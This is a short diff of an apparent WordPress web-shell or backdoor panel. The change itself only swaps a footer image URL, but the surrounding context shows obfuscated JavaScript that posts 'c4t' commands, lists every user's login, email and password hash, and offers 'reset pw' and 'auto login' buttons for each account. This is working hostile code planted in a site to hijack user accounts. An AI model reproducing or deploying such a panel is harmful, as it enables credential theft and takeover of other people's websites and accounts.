@@ -96,7 +96,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['c4t'])) {
         <span id="s2"></span>
     </div>
 </div>
-<footer><center><img src="https://i.ibb.co.com/tTNb9hYz/photo-2024-12-07-17-20-32.png" referrerpolicy="unsafe-url" /></center></footer>
+<footer><center><img src="https://i.ibb.co.com/5Xv2Z0KB/whit.png" referrerpolicy="unsafe-url" /></center></footer>
 <script>
 function m1(d,cb){var r=new XMLHttpRequest();r.open("POST","",true);r.setRequestHeader("Content-type","application/x-www-form-urlencoded");r.onload=function(){cb(r.responseText)};let q=[];for(let k in d){q.push(encodeURIComponent(k)+"="+encodeURIComponent(d[k]))}r.send(q.join("&"));}
 function y9(){m1({c4t:'ulst'},function(res){let js=JSON.parse(res);let tb=document.getElementById('t7').querySelector('tbody');tb.innerHTML='';js.forEach(function(u){let tr=document.createElement('tr');tr.innerHTML='<td>'+u.ID+'</td><td>'+u.user_login+'</td><td>'+u.user_email+'</td><td style="font-size:.96em;word-break:break-all;">'+u.user_pass+'</td><td>'+u.user_registered+'</td>'+'<td><button class="bx" onclick="z3('+u.ID+',this)">reset pw</button> <button class="bx" onclick="v8('+u.ID+')">auto login</button></td>';tb.appendChild(tr);});});}
